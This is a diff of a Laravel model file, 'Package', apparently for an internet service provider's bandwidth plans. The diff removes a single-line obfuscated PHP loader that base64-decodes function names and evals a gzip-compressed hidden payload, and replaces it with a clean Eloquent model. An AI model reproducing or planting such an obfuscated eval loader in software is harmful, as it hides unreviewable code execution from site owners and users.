@@ -1,1 +1,36 @@
-<?php $_='a1ef7aee';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNqNU91zojAQf7+/gofOUGfugYB2znF8KFSieKUVW/Lx4phEASXAlKrAX9/Uj9PWmbvLzMJm97e/3WyymnZYN7Pz6utzwMTdcr7UezcHQ/GWZO9q+0O7wPc1HYPulqEwI5N+X9fO7hNfX6k6l6EhsLcZOXYqpFuOnWCJwa/iafcZpH0lnWnaPojNy8VdeyYWPBcLvXdV4sMk9x3ZiVX2hkN3Rae2zYc2f0HdNUVV87Qzxg+TAnDzNZqiqhQIFEy6Bg2rAcFBTKTbKN1lsFsJFG6EW0GCfINZXkGxz6fQbQLprgTs1ouX0neysFE5PAYrwFC6URwpHgSxgG5CsK/0sGSWCyjqGHgAthSG5bGGFVNcvLYniv+NIJGOYNgWMNzQ4WN0qHen+FWO5D5STTrU/D1/ZIxHjvIP7ZpZQUqUUOd+TWVaKv6EwdfoeWoz1Zdoj9uLtyEIpKNkd+Q+SmbXc+Rf22WwFWanZKa7vo4Jd6pXMXVG5bccibrcRrjdNbPE5h8YwGG1JWiS/L4/nucgCcnCmlvBUsC4Vv3PmVmtsfmXeqQHeOYb2Apy9cCaOeyW9L/403c6vaovpqaoKRLqPtMtS85+/LX3gMiqILUtBeqsDli7odgzP/vJ66g4xS12l/ltdaYAcNmOvGGQz/Hj+7OMY26AmGXr/NUMayHTFX3J74hZxdx6LJ5O8UNDvQ0lkRqWiwE7j9j+f3vctfYTe2Fr9U7IvfFW//zqP//Avw7fkef2ctZard4HwWdOqw=='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Models;
+
+use Illuminate\Database\Eloquent\Factories\HasFactory;
+use Illuminate\Database\Eloquent\Model;
+
+class Package extends Model
+{
+    use HasFactory;
+
+    protected $fillable = [
+        "name",
+        "price",
+        "download",
+        "upload",
+        "burst_download",
+        "burst_upload",
+        "burst_threshold_download",
+        "burst_threshold_upload",
+        "burst_time",
+        "aggregation",
+        "type",
+        "info",
+        "customer_upgrade",
+    ];
+
+    protected $casts = [
+        "info" => "array",
+    ];
+
+    public function services()
+    {
+        return $this->hasMany(Service::class);
+    }
+}
